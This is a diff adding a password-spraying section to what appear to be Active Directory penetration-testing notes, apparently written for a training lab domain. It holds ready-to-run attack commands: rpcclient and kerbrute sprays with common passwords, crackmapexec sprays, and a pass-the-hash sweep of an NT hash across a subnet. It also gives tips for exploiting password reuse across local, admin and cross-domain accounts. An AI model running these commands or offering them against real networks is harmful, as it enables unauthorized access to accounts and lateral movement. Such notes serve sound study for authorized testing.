@@ -237,3 +237,29 @@ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclas
 ```shell
 kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
 ```
+
+### Internal Password Spraying
+**From Linux**
+- bash
+```shell
+for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+```
+- Kerbrute 
+```shell
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
+```
+- crackMapExec  / netexec
+```shell
+sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
+
+sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
+```
+#### Notes 
+1) It is worth targeting high-value hosts such as SQL or Microsoft Exchange servers, as they are more likely to have a highly privileged user logged in or have their credentials persistent in memory.
+2) When working with `local administrator accounts`, consider `password re-use` or `common password formats` across accounts. If we find a desktop host with the local administrator account password set to something unique such as `$desktop%@admin123`, it might be worth attempting `$server%@admin123` against servers.
+3) if we find `non-standard local administrator` accounts such as `bsmith`, we may find that the password is reused for a similarly named domain user account. The same principle may apply to domain accounts. If we retrieve the password for a user named `ajones`, it is worth trying the same password on their admin account (if the user has one), for example, `ajones_adm`, to see if they are reusing their passwords.
+4) We may obtain valid credentials for a user in `domain A` that are valid for a user with the same or similar username in `domain B` or vice-versa.
+5) Sometimes we may only retrieve the `NTLM hash` for the `local administrator account` from the local SAM database. In these instances, we can spray the NT hash across an entire subnet (or multiple subnets) to hunt for local administrator accounts with the same password set.
+```shell
+sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+```
